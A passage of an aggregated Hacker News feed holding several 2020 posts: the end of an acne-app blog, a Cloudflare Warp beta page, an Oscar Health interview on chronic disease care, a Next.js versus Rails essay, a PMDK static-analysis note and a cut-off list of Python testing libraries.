<p>In my free time I decided to learn React-Native to make an app (with some help of course) to streamline this process. It took loads of work between coding, making art assets, making a website, etc. but I think the acne solving method above is now much more straight forward. Especially for people who don’t consider themselves “technical”. Anyone with problem skin can now find a solution using this <a href="https://www.skintheory.app/">SkinTheory Method</a> without the <a href="https://www.urbandictionary.com/define.php?term=pita">PITA</a> overhead of managing a huge Google Doc and Flickr Library. Also, photos are sneakily hidden away in the app in order to not peskily show up in the phone gallery when you’re showing friends your cute dog pics.</p>



<h2>Skin Success</h2>



<p>So, if you like to see the results of my “Before &amp; After pics” here’s a pic with some of the fam below. I’ve moved to Ireland since I graduated so we’re out on my cousin’s farm.</p>



<div><figure><img loading="lazy" src="https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/IMG_1519-1.jpg?resize=512%2C384&amp;ssl=1" alt="" width="512" height="384" srcset="https://i0.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/IMG_1519-1-scaled.jpg?resize=1024%2C768&amp;ssl=1 1024w, https://i0.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/IMG_1519-1-scaled.jpg?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/IMG_1519-1-scaled.jpg?resize=768%2C576&amp;ssl=1 768w, https://i0.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/IMG_1519-1-scaled.jpg?resize=1536%2C1152&amp;ssl=1 1536w, https://i0.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/IMG_1519-1-scaled.jpg?resize=2048%2C1536&amp;ssl=1 2048w, https://i0.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/IMG_1519-1-scaled.jpg?resize=1200%2C900&amp;ssl=1 1200w, https://i0.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/IMG_1519-1-scaled.jpg?resize=1980%2C1485&amp;ssl=1 1980w, https://i0.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/IMG_1519-1-scaled.jpg?w=1740&amp;ssl=1 1740w" sizes="(max-width: 512px) 100vw, 512px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/IMG_1519-1-scaled.jpg?resize=1024%2C768&amp;ssl=1 1024w, https://i0.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/IMG_1519-1-scaled.jpg?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/IMG_1519-1-scaled.jpg?resize=768%2C576&amp;ssl=1 768w, https://i0.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/IMG_1519-1-scaled.jpg?resize=1536%2C1152&amp;ssl=1 1536w, https://i0.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/IMG_1519-1-scaled.jpg?resize=2048%2C1536&amp;ssl=1 2048w, https://i0.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/IMG_1519-1-scaled.jpg?resize=1200%2C900&amp;ssl=1 1200w, https://i0.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/IMG_1519-1-scaled.jpg?resize=1980%2C1485&amp;ssl=1 1980w, https://i0.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/IMG_1519-1-scaled.jpg?w=1740&amp;ssl=1 1740w" data-lazy-src="https://i1.wp.com/blog.skintheory.app/wp-content/uploads/2020/08/IMG_1519-1.jpg?resize=512%2C384&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>I’m completely clear now and most of the scarring has healed. It’s a liberating feeling to be past acne but it did take time to find the correct regimen.</p>



<p>To wrap up what worked for me, I have crazy sensitive skin. The normal benzoyl peroxides and salicylic acids for solving acne would irritate my skin and cause more acne. I learned that I had to be moisturizing daily (thanks <a href="http://acne.org/">Acne.org</a>!), using gentle <a href="https://www.acne.org/comedogenic-list.html">non-comedogenic</a> moisturizers and soaps, and managing my stress. College caused huge stress and also affected my sleeping/eating habits which seemed to be causing more acne for me.</p>



<p>In the end, the SkinTheory Method helped me act as a scientist, testing and isolating factors affecting my own skin. It gave me the peace of mind that I was doing something at each step to control my acne. It paid off. <strong>Best of luck with your</strong> <strong>own experiments. 🔬</strong></p>



<h2 id="notes">Extra Notes</h2>



<p>[1]: Whether you have Computer Science know-how or not: I highly recommend this book on thinking about algorithms in day-to-day life (non-affiliate link): <a href="https://www.goodreads.com/book/show/25666050-algorithms-to-live-by">Algorithms to Live By: The Computer Science of Human Decisions by Brian Christian</a></p>

		</div><!-- .entry-content -->

	</div></div>]]>
            </description>
            <link>https://blog.skintheory.app/skintheorys-birth/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24275521</guid>
            <pubDate>Tue, 25 Aug 2020 20:07:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cloudflare Warp Beta for macOS and Windows]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24275292">thread link</a>) | @0xbkt
<br/>
August 25, 2020 | https://1.1.1.1/beta/ | <a href="https://web.archive.org/web/*/https://1.1.1.1/beta/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-depth-perspective-root=""><div><div><div data-depth="3"><div><h2 data-js-balance-text="">Thank you for helping us make a safer and faster internet for the desktop</h2><div data-js-balance-text=""><p>Select the appropriate link to download the desktop app for your system. This is a Beta release, so remember to provide feedback and learn about known issues using the link below.</p><p><a href="https://support.cloudflarewarp.com/hc/en-us/articles/360051891794-Beta-Known-issues" target="_blank">Learn more about known issues</a></p></div></div></div></div><div><div><p>macOS Catalina</p><div><p>Minimum system <br> requirements</p><p>10.15 or higher <br> 64 bit only</p></div><p><a href="https://support.cloudflarewarp.com/hc/en-us/articles/360051891814-Beta-Install-Instructions">macOS installation Instructions</a></p><p>Windows 10</p><div><p>Minimum system <br> requirements</p><p>1909 or higher <br> 64 bit only</p></div><p>Windows Installation instructions</p></div></div><div data-depth-perspective-scroll-anchor="" data-depth="3"><div><div><div><div><div><div><p>Minimum system <br> requirements</p></div><div> <p>10.15 or higher <br> 64 bit only</p></div><div><p>1909 or higher <br> 64 bit only</p></div></div></div></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://1.1.1.1/beta/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24275292</guid>
            <pubDate>Tue, 25 Aug 2020 19:49:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Behind the Scenes – An Inside Look at the $3.5T Chronic Disease Industry]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24275187">thread link</a>) | @Chetane
<br/>
August 25, 2020 | https://flowdash.com/blog/behind-the-scenes-an-inside-look-at-the-3-5-trillion-chronic-disease-industry/ | <a href="https://web.archive.org/web/*/https://flowdash.com/blog/behind-the-scenes-an-inside-look-at-the-3-5-trillion-chronic-disease-industry/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><em>“Behind the Scenes” is a series focused on highlighting the unsung heroes – Operations teams. </em><em>Their work is often critical to the operations of the company, yet few if any customers know they exist. Our goal is to bring these teams to light and surface the amazing work they do day-to-day to keep the products we love humming along smoothly.</em></p>



<p>We spoke with Shohini, Product Manager at Oscar Health – a health insurance company headquartered in New York City whose mission is to “do our part to dismantle and rebuild the country’s broken health care system and improve health outcomes for everyone”.<span id="easy-footnote-1-57"></span><span><a href="#easy-footnote-bottom-1-57" title="&amp;#8220;About Oscar Health&amp;#8221;, accessed August 18, 2020, https://www.hioscar.com/about."><sup>1</sup></a></span> Shohini’s team, Digital Member Experience, builds products to empower users to easily find the care that they need<strong>.</strong></p>



<p>We discussed her thoughts on a current project at Oscar Health, how she thought through her career path, and her advice for new grads on how to choose a role or company.</p>



<p><strong>Project Highlight – Chronic Disease, the $3.5 Trillion Industry</strong></p>



<p>Shohini walks me through Oscar Health’s upcoming Virtual Care Program, a program that provides patients with no-cost telemedicine visits with an Oscar Health primary care provider and provides free downstream services such as labs, medical equipment, and prescriptions. Her focus is on managing care routing, mainly driving adoption and tailoring the user experience.&nbsp;</p>



<p>Oscar’s unique positioning as an insurer, and now care delivery provider, allows them to disrupt the current service model – namely when a patient’s provider and insurer are two parties pitted against each other, with no coordination. Ideal especially during COVID, the program’s goal is to incentivize patients to exercise preventative care, allowing them to save on potential financial, emotional, and physical constraints that come from unmanaged diseases.&nbsp;</p>



<p>The long term goal of many virtual care programs is to help patients manage and bring down the cost of chronic diseases. Chronic disease is defined broadly as “conditions that last 1 year or more and require ongoing medical attention or limit activities of daily living or both.”<span id="easy-footnote-2-57"></span><span><a href="#easy-footnote-bottom-2-57" title="CDC, &amp;#8220;About Chronic Diseases&amp;#8221;, accessed August 18, 2020, <a href=&quot;https://www.cdc.gov/chronicdisease/about/index.htm#:~:text=Chronic%20diseases%20are%20defined%20broadly,disability%20in%20the%20United%20States.&quot;>https://www.cdc.gov/chronicdisease/about/index.htm#:~:text=Chronic%20diseases%20are%20defined%20broadly,disability%20in%20the%20United%20State.</a>"><sup>2</sup></a></span> As the country’s leading cause of death and disability, chronic disease has affected 6 out of 10 Americans, lead to the deaths of 1.7 million Americans annually, and accounts for a whopping $3.5 trillion in healthcare costs every year.<span id="easy-footnote-3-57"></span><span><a href="#easy-footnote-bottom-3-57" title="CDC, &amp;#8220;About Chronic Diseases&amp;#8221;, accessed August 18, 2020, <a href=&quot;https://www.cdc.gov/chronicdisease/about/index.htm#:~:text=Chronic%20diseases%20are%20defined%20broadly,disability%20in%20the%20United%20States.&quot; data-type=&quot;URL&quot; data-id=&quot;https://www.cdc.gov/chronicdisease/about/index.htm#:~:text=Chronic%20diseases%20are%20defined%20broadly,disability%20in%20the%20United%20States.&quot;><a href=&quot;https://www.cdc.gov/chronicdisease/about/index.htm#:~:text=Chronic%20diseases%20are%20defined%20broadly,disability%20in%20the%20United%20States.&quot;>https://www.cdc.gov/chronicdisease/about/index.htm#:~:text=Chronic%20diseases%20are%20defined%20broadly,disability%20in%20the%20United%20States.</a></a>"><sup>3</sup></a></span>&nbsp; To make matters worse, the prevalence rate of chronic disease is increasing. With the advancement of medicine leading to longer lifespans, as well as existing risk factors such as poor nutrition, smoking, and excessive alcohol use, the effects of heart disease, cancer, and stroke (top chronic diseases) has led to a greater impact on the wider American population and has thus attracted a greater focus from the healthcare industry.&nbsp;</p>



<p>Many within the industry are aiming to solve the problem of chronic diseases – some remedies being chronic disease focused primary care, Medicare payment models, and even tech investments focused on Medicaid populations. Medicare is a federal insurance program that provides health coverage for Americans 65 years or older or younger and disabled. Given the older population, Medicare sees a higher concentration of chronic diseases across its participants. In contrast, Medicaid is a state and federal assistance program that serves a low-income population, another hub for potential high rates of chronic disease due to structural disadvantages.</p>



<p>The main pain point here, Shohini highlights, is the ruthless cycle of poverty, where healthcare is more often mixed in with other economic, educational, and social gaps. For example, a low-income American would have access to low quality housing and food, leading to greater likelihood of contracting diseases. This circumstance would ultimately lead to greater time spent having to go to doctor’s appointments, more money lost given the increased number of visits, and low productivity due to the physical, emotional, and financial stressors. Care is needed, but financial incentives make it difficult to distribute to those most in need. Oscar Health, through its focus on easy-to-use and no-cost preventative care, hopes to test a different economic model for healthcare that actually incentivizes preventative care in the general population. In focusing more specifically on tackling chronic diseases and addressing social determinants of health, Oscar’s new program will hopefully lead to a brighter, healthier future for the American population.</p>



<p><strong>Shohini’s Background – Why Oscar Health?&nbsp;</strong></p>



<p>Shohini’s career is threaded with the principle of “working to build and expand upon basic services for people”. Coming from UC Berkeley with an initial focus on International Relations and Policy, she pivoted into tech by interning for Oscar Health as a Product Management intern focused on insurance infrastructure. She then transitioned to an operational role at Savvy, an early-stage healthcare startup based in the Bay Area. Both experiences brought their respective learnings and perspectives.</p>



<p>Upon experiencing both an early-stage startup and larger-scale company, Shohini details the different pros and cons she experienced from both. The startup allowed for flexibility, quick decision-making and re-prioritization but at the cost of less structured experimentation. On the flip-side, the larger-scale company had access to a broader range of healthcare experts and ample data. As a side effect, however, more stakeholders led to greater time spent gathering project feedback and buy-in.</p>



<p>Ultimately Shohini landed back at Oscar Health, charged with broader experiences and fresh learnings, ready to help tackle the company’s mission of making virtual care and healthcare concepts more accessible. She rejoined excited to learn more broadly about healthcare and to continue her personal mission of “expanding basic services”. Not only is she able to be part of a company that aligns with her personal mission, but her function allows her to play a pivotal role in actively building products to improve the care experience for the user.</p>



<p><strong>Advice for New Grads – Materialize the Change You Want to Make&nbsp;</strong></p>



<p>Shohini speaks to her internship experience at Oscar Health and her approach to understanding whether or not the company was the right fit. Driving projects given to her were of course learning experiences, but going beyond the assigned work allowed her to fully maximize her time there. She grabbed coffees with people and teams outside of her scope in order to explore her interests. She dug into understanding which projects (outside of her day-to-day) were prioritized as a company. She socialized with colleagues after work, observing to see if the company would be a good culture fit. All were factors that played important roles in having Shohini choose the right company, the right team, and the right product.</p>



<p>Zooming out, she provides three actionable principles she used to help her decision-making process for choosing a company/role:</p>



<p>1) Have a clear idea of the outcome you want to create.&nbsp;</p>



<p>2) Understand what the gaps are of the company and whether that’s exciting to you.&nbsp;</p>



<p>3) Pick a mission or product that you’re building over a specific role. It’s easy to be drawn towards specific companies for the sake of the title or prestige, but at the end of the day, choose based on your passion and interests. And <em>that</em> is what will provide long-term impact.</p>



<p>In summary, Shohini’s Virtual Care project, journey of navigating different companies and functions, and thinking through culture and company fit, all highlight the importance of mission and impact – execution for the the sake of execution can take you only so far, but execution with a purpose leads to greater momentum, longevity, and well-being.</p>



<p>Interested in learning about Oscar Health’s COVID resources? Click here: <a href="https://www.hioscar.com/covid19">https://www.hioscar.com/covid19</a></p>



<p>To learn more about Oscar Health, you can find more information here: <a href="https://www.hioscar.com/about">https://www.hioscar.com/about</a></p>



<p>To learn more about Savvy, you can find more information here: <a href="https://www.gosavvy.com/">https://www.gosavvy.com/</a></p>



<p><strong><a href="https://flowdash.com/">Flowdash’s</a> mission is to bring happiness back to the workplace by changing the way people create software. We’re making it easier to build applications without code so that individuals within every organization are empowered to create the tools they need — the tools they deserve.</strong></p>
<ol><li><span id="easy-footnote-bottom-1-57"></span>“About Oscar Health”, accessed August 18, 2020, https://www.hioscar.com/about.<a href="#easy-footnote-1-57"></a></li><li><span id="easy-footnote-bottom-2-57"></span>CDC, “About Chronic Diseases”, accessed August 18, 2020, <a href="https://www.cdc.gov/chronicdisease/about/index.htm#:~:text=Chronic%20diseases%20are%20defined%20broadly,disability%20in%20the%20United%20States.">https://www.cdc.gov/chronicdisease/about/index.htm#:~:text=Chronic%20diseases%20are%20defined%20broadly,disability%20in%20the%20United%20State.</a><a href="#easy-footnote-2-57"></a></li><li><span id="easy-footnote-bottom-3-57"></span>CDC, “About Chronic Diseases”, accessed August 18, 2020, <a href="https://www.cdc.gov/chronicdisease/about/index.htm#:~:text=Chronic%20diseases%20are%20defined%20broadly,disability%20in%20the%20United%20States." data-type="URL" data-id="https://www.cdc.gov/chronicdisease/about/index.htm#:~:text=Chronic%20diseases%20are%20defined%20broadly,disability%20in%20the%20United%20States."></a><a href="https://www.cdc.gov/chronicdisease/about/index.htm#:~:text=Chronic%20diseases%20are%20defined%20broadly,disability%20in%20the%20United%20States.">https://www.cdc.gov/chronicdisease/about/index.htm#:~:text=Chronic%20diseases%20are%20defined%20broadly,disability%20in%20the%20United%20States.</a><a href="#easy-footnote-3-57"></a></li></ol></div></div>]]>
            </description>
            <link>https://flowdash.com/blog/behind-the-scenes-an-inside-look-at-the-3-5-trillion-chronic-disease-industry/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24275187</guid>
            <pubDate>Tue, 25 Aug 2020 19:40:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[React with Next.js vs. Ruby on Rails]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24275175">thread link</a>) | @kirillzubovsky
<br/>
August 25, 2020 | https://suddenschools.org/blog/react-nextjs-vs-ruby-on-rails | <a href="https://web.archive.org/web/*/https://suddenschools.org/blog/react-nextjs-vs-ruby-on-rails">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>As a long-time Ruby on Rails developer I was really hesitant to try something new. Learning is time consuming, it requires exploring and making mistakes. Why bother, if you already know a language that works pretty great, and gets the job done?</p>
<p>While Ruby is a lovely language, and Rails is a fantastic framework which enabled countless startups to launch and become famous, Rails also has limitations which can be easily overcome with React, and the time and cost savings are worth the initial learning curve.</p>
<p>React enables a smooth transition from a monolith app, where everything is programmed from one code base, to a component based app, where logic, data, and presentation are handled by multiple applications. It was developed out of necessity to run an efficient engineering operations with thousands of developers, but it scales equally well for a company of one.</p>
<p>With React you can easily split your application into parts where front and back are developed, maintained and deployed by different teams, at different times. This improves flexibility across the board. Different teams can work on a single app, but improve it in steps, without affecting each other.</p>
<p>React simply listens to new data and updates your application when the data is updated. It's magic!</p>
<p>Facebook, the React parent, did lots of pretty forward-thinking development, and Rails team has been playing catch up. Rails is still a great way to build logic bits for your application, to be the brain and the datacenter of your app, but as far as display of information is concerned, React is a few steps ahead.</p>
<p>Before <a href="https://nextjs.org/">Next.js</a>, I was afraid of React. If something broke in Rails, I knew where to fix it, or at least how to look for the right information which would enable me to fix it. I was familiar with a bunch of useful gems, and the MVC model was well engrained in my head. Rails was familiar, and comfortable. The paradigm change from Rails to webpack/node/react ..etc, it seemed more work than I was willing to put in. </p>
<p>Next changed everything. They took everything that was good about React, sprinkled some useful simplifications, made it idiot-proof (thank you!), and put it all on efficient pipeline that deploys blazingly fast (seconds vs. minutes). Now that I have taken the time to understand it a little, I can launch a brand new website using Next in a matter of minutes, deploy it to Vercel in seconds, and show it to customers in that moment. Then, if I want to make a change, re-deployment only takes a few seconds. Quite literally, it took only 35 seconds to deploy this blog post.</p>
<p>If I were to pick my top 3 favorites about Next, it would be this. (1) It turns your entire website into a series of static pages that render really fast, for really cheap. Right now, hobby hosting on Vercel costs $0, and that's a pretty great price! (2) Next.js does not require a database to start, which removes the unnecessary complexity for both local dev and deploy. On top of that, when needed, the "database" can be literally anything, from Postgres to a Google Sheet, which again makes it simple and cheap. (3) It's made React Routing manageable, so when users click on a link, it works just like it would in a normal static html, with the underlying complexity hidden away. This might be a small thing by dev standards, but it's a huge plus when it comes for a particular purpose of lauching usable websites.</p>
<p>Learning gives you options, whether you are learning a new foreign language, or learning to use a fork, learning enables a new experience that leads to new, usually better outcomes. It is no different for programming, and I highly recommend Next.js as step in the right direction.</p>
<p>Take a look on their website, look at the showcase for social proof, and of course if you want a bit more information without having to dig it up yourself, sign up for one of the <a href="https://suddenschools.org/">Sudden Schools</a> courses, and have it explained in short delightful videos.</p>
<p>Hope to see you soon!</p>
</div></div></div>]]>
            </description>
            <link>https://suddenschools.org/blog/react-nextjs-vs-ruby-on-rails</link>
            <guid isPermaLink="false">hacker-news-small-sites-24275175</guid>
            <pubDate>Tue, 25 Aug 2020 19:39:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pmem.io: Static code analysis of the PMDK]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24275157">thread link</a>) | @EvgeniyZh
<br/>
August 25, 2020 | https://pmem.io//2020/08/20/pmdk-pvs-studio.html | <a href="https://web.archive.org/web/*/https://pmem.io//2020/08/20/pmdk-pvs-studio.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrap">
	
	
	<br>
	<h3>Static code analysis of the PMDK</h3>
	<ul>
	</ul>
	<div id="postinfo"><p>Posted August 20, 2020&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
	
	<span size="-1"><a href="https://pmem.io/2020/05/27/llpl-intro1.html" title="Introduction to LLPL">«&nbsp;Previous&nbsp;post</a></span>&nbsp;&nbsp;&nbsp;&nbsp;
	
	
	</p></div>
	
	

<p>In the PMDK team, we focus on the quality of our codebase. One of the
standard practices in the software development is a static code analysis, which
improves the overall project quality and fixes bugs in the early stage of
development. Since there is no silver bullet for avoiding bugs, we already use
two different static analysis tools and many runtime checkers e.g. <a href="https://www.youtube.com/watch?v=R2m-wH7W-5U">valgrind</a>.
Improving static analysis effectiveness is a separate academic problem. What is
worth mentioning is the fact that different tools take a various approach. With
combined advantages of Open Source projects such as transparency and
reliability, as well as a new static analysis tool, we get a new bag of tricks
and a fresh look to an old problem :).</p>



<p><a href="https://viva64.com/en/pvs-studio/">PVS-Studio</a> is a static-analysis tool for detecting bugs and
security weaknesses in the source code of programs. What distinguishes
PVS-Studio is their comprehensive support for open-source projects.
After a quick e-mail exchange, the PVS-Studio team agreed to perform an analysis
of the PMDK project. The analysis is available in this <a href="https://viva64.com/en/b/0756/">post</a>.</p>



<p>PVS-Studio managed to find a couple of issues, which were not previously
detected; we analyzed detected bugs and addressed changes in the following
<a href="https://github.com/pmem/pmdk/pull/4942">Pull Request</a>. From my experience, I highly recommend cooperating with
the PVS-Studio team - excellent support and quick response time allows us to
improve the PMDK project. See <a href="https://viva64.com/en/pvs-studio/">PVS-Studio</a> yourself :)</p>


	

	
	
	
	
	


	
</div></div>]]>
            </description>
            <link>https://pmem.io//2020/08/20/pmdk-pvs-studio.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24275157</guid>
            <pubDate>Tue, 25 Aug 2020 19:38:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Python libraries to make your code readable, reliable and maintainable]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24275037">thread link</a>) | @makaimc
<br/>
August 25, 2020 | https://isaak.dev/2020/08/python-libraries-to-make-your-code-readable-and-maintainable | <a href="https://web.archive.org/web/*/https://isaak.dev/2020/08/python-libraries-to-make-your-code-readable-and-maintainable">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Experienced programmers understand perfectly well that in development they spend most of the time reading code 
and therefore they treat the process of writing code with the deepest trepidation (and sometimes with fanaticism). 
To write quality and maintainable code, you need to take the time to write tests and integrate QA tools. There is a 
whole technique aimed at test-driven development (<a href="https://en.wikipedia.org/wiki/Test-driven_development">TDD</a>) and I will not devote this article to the topic of testing as 
such. Tests are absolutely necessary and there is nothing to discuss. In this article, we are going to talk about tools 
that help you write quality Python code.</p>

<p>Table of content:</p>

<ul>
  <li><a href="#testing-frameworks">Testing Frameworks</a></li>
  <li><a href="#test-runners">Test Runners</a></li>
  <li><a href="#e2e-testing-gui--frontend">E2E Testing</a></li>
  <li><a href="#fake-data">Fake Data</a></li>
  <li><a href="#mocking">Mocking</a></li>
  <li><a href="#code-coverage">Code coverage</a></li>
  <li><a href="#object-factories">Object Factories</a></li>
  <li><a href="#code-style">Code Style</a></li>
  <li><a href="#typing">Typing</a></li>
</ul>


      <h2 id="testing-frameworks">
        
        <a href="#testing-frameworks">Testing Frameworks</a>
        
      </h2>

<p><a href="https://github.com/pytest-dev/pytest/"><strong>pytest</strong></a> is a framework that makes it easy to write small tests, yet scales to support complex functional testing for applications and libraries.</p>

<p>Features</p>

<ul>
  <li>Detailed info on failing assert statements (no need to remember self.assert* names);</li>
  <li>Auto-discovery of test modules and functions;</li>
  <li>Modular fixtures for managing small or parametrized long-lived test resources;</li>
  <li>Can run <code>unittest</code> (including trial) and nose test suites out of the box;</li>
  <li>Python 3.5+ and PyPy 3;</li>
  <li>Rich plugin architecture, with over 315+ external plugins and thriving community;</li>
</ul>



<p><a href="https://github.com/HypothesisWorks/hypothesis"><strong>Hypothesis</strong></a>  is a family of testing libraries that let you write 
tests parametrized by a source of examples. A Hypothesis implementation then generates simple and comprehensible 
examples that make your tests fail. This simplifies writing your tests and makes them more powerful at the same time, 
by letting software automate the boring bits and do them to a higher standard than a human would, freeing you to focus 
on the higher-level test logic.</p>



<p><a href="https://github.com/robotframework/robotframework"><strong>Robot Framework</strong></a> is a generic open-source automation framework 
for acceptance testing, acceptance test-driven development (ATDD), and robotic process automation (RPA). 
It has simple plain text syntax and it can be extended easily with libraries implemented using Python or Java.</p>



<p><a href="https://docs.python.org/3/library/unittest.html"><strong>unittest</strong></a> is a unit testing framework from Python’s stdlib, 
which was originally inspired by JUnit and has a similar flavor as major unit testing frameworks in other languages. 
It supports test automation, sharing of setup and shutdown code for tests, aggregation of tests into collections, 
and independence of the tests from the reporting framework.</p>




    
      <h2 id="test-runners">
        
        <a href="#test-runners">Test Runners</a>
        
      </h2>

<p><a href="https://github.com/tox-dev/tox"><strong>tox</strong></a> is a command-line driven CI frontend and development task automation tool.</p>

<p>tox creates virtual environments for all configured so-called <code>testenvs</code>, it then installs the project and other necessary dependencies and runs the configured set of commands:</p>

<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598270513268/Q1-E6b6nw.png" alt="image.png"></p>




    
      <h2 id="e2e-testing-gui--frontend">
        
        <a href="#e2e-testing-gui--frontend">E2E Testing (GUI / Frontend)</a>
        
      </h2>

<p><a href="https://github.com/SeleniumHQ/selenium/"><strong>Selenium</strong></a> is an umbrella project encapsulating a variety of tools and 
libraries enabling web browser automation. Selenium specifically provides an infrastructure for the W3C WebDriver 
specification — a platform and language-neutral coding interface compatible with all major web browsers.</p>



<p><a href="https://github.com/locustio/locust"><strong>Locust</strong></a> is an easy to use, scriptable, and scalable performance testing tool.
 You define the behavior of your users in regular Python code, instead of using a clunky UI or domain-specific 
 language. This makes Locust infinitely expandable and very developer-friendly.</p>



<p><a href="https://github.com/DevExpress/testcafe"><strong>TestCafe</strong></a> is a Node.js tool to automate end-to-end web testing. Write 
tests in JS or TypeScript, run them, and view results.</p>

<ul>
  <li><strong>Works on all popular environments</strong>: TestCafe runs on Windows, MacOS, and Linux. It supports desktop, mobile, remote and cloud <a href="https://devexpress.github.io/testcafe/documentation/using-testcafe/common-concepts/browsers/browser-support.html">browsers</a> (UI or headless).</li>
  <li><strong>1 minute to set up</strong>: You <a href="https://devexpress.github.io/testcafe/faq/#i-have-heard-that-testcafe-does-not-use-selenium-how-does-it-operate">do not need WebDriver</a> or any other testing software. Install TestCafe with one command, and you are ready to test: <code>npm install -g testcafe</code></li>
  <li><strong>Free and open source</strong>: TestCafe is free to use under the <a href="https://github.com/DevExpress/testcafe/blob/master/LICENSE">MIT license</a>. <a href="#plugins">Plugins</a> provide custom reports, integration with other tools, launching tests from IDE, etc. You can use the plugins made by the GitHub community or make your own.</li>
</ul>

<p>Usage example:</p>

<p><img src="https://raw.githubusercontent.com/DevExpress/testcafe/master/media/install-and-run-test.gif" alt="Install TestCafe and Run a Test"></p>



<p><a href="https://github.com/asweigart/pyautogui"><strong>PyAutoGUI</strong></a> is a cross-platform GUI automation Python module for human beings. 
Used to programmatically control the mouse &amp; keyboard.</p>




    
      <h2 id="fake-data">
        
        <a href="#fake-data">Fake Data</a>
        
      </h2>

<p><a href="https://github.com/lk-geimfari/mimesis"><strong>Mimesis</strong></a> is a high-performance fake data generator for Python, which
provides data for a variety of purposes in a variety of languages. The
fake data could be used to populate a testing database, create fake API
endpoints, create JSON and XML files of arbitrary structure, anonymize
data taken from production and etc.</p>

<p>The key features are:</p>

<ul>
  <li><strong>Performance</strong>: The <a href="https://mimesis.name/foreword.html#performance">fastest</a> data generator available for Python.</li>
  <li><strong>Extensibility</strong>: You can create your own data providers and use them with Mimesis.</li>
  <li><strong>Generic data provider</strong>: The <a href="https://mimesis.name/getting_started.html#generic-provider">simplified</a> access to all the providers from a single object.</li>
  <li><strong>Multilingual</strong>: Supports data for <a href="https://mimesis.name/getting_started.html#locales">a lot of languages</a>.</li>
  <li><strong>Data variety</strong>: Supports <a href="https://mimesis.name/api.html">a lot of data providers</a> for a variety of purposes.</li>
  <li><strong>Schema-based generators</strong>: Provides an easy mechanism to generate data by the schema of any complexity.</li>
  <li><strong>Country-specific data providers</strong>: Provides data specific only for <a href="https://mimesis.name/api.html#builtin-data-providers">some countries</a>.</li>
</ul>




    
      <h2 id="mocking">
        
        <a href="#mocking">Mocking</a>
        
      </h2>

<p><a href="https://docs.python.org/3/library/unittest.mock.html"><strong>unittest.mock</strong></a> is a library from Python’s stdlib for mocking. 
It allows you to replace parts of your system under test with mock objects and make assertions about how they have been used.</p>

<p><code>unittest.mock</code> provides a core <code>Mock</code> class removing the need to create a host of stubs throughout your test suite. 
After performing an action, you can make assertions about which methods / attributes were used and arguments they
were called with. You can also specify return values and set needed attributes in the normal way.</p>



<p><a href="https://github.com/spulec/freezegun"><strong>FreezeGun</strong></a> is a library that allows your Python tests to travel through time
 by mocking the datetime module.</p>

<p>Once the decorator or context manager have been invoked, all calls to <code>datetime.datetime.now()</code>, 
<code>datetime.datetime.utcnow()</code>, <code>datetime.date.today()</code>, <code>time.time()</code>, <code>time.localtime()</code>, <code>time.gmtime()</code>, and <code>time.strftime()</code>
will return the time that has been frozen.</p>



<p><a href="https://github.com/patrys/httmock"><strong>HTTPretty</strong></a> is an HTTP client mocking tool for Python - inspired by Fakeweb for Ruby.</p>

<p>Common use cases:</p>

<ul>
  <li>Test-driven development of API integrations</li>
  <li>Fake responses of external APIs</li>
  <li>Record and playback HTTP requests</li>
</ul>



<p><a href="https://github.com/getsentry/responses"><strong>responses</strong></a> is a utility library for mocking out the requests Python library.</p>

<p>Example of usage:</p>

<div><div><pre><code><span>import</span> <span>responses</span>
<span>import</span> <span>requests</span>

<span>@</span><span>responses</span><span>.</span><span>activate</span>
<span>def</span> <span>test_simple</span><span>():</span>
